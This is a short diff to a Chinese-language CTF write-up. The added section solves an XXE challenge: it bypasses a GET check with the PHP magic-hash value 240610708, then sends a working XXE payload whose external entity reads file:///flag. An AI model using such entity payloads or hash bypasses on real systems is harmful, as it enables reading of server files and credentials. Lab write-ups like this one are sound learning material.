@@ -189,3 +189,26 @@ rotected的参数变成 \00*\00test3
 [參考文章](https://hellohxk.com/blog/ssti/)
 
 ### 0x04 (XXE)
+
+GET用240610708來繞過
+
+丟以下data進post內容
+```
+<abcdef>
+ <MyFirstCTF>Hello</MyFirstCTF>
+</abcdef>
+```
+XML解析有回應
+
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE yiyu [ <!ELEMENT methodname ANY > 
+<!ENTITY xxe SYSTEM "file:///flag" >]> 
+<methodcall> 
+<MyFirstCTF>&xxe;</MyFirstCTF> 
+</methodcall>
+```
+flag的實際路徑亂猜的 結果就中了ㄏㄏ
+
+[參考文章](http://www.freebuf.com/column/156863.html
+)
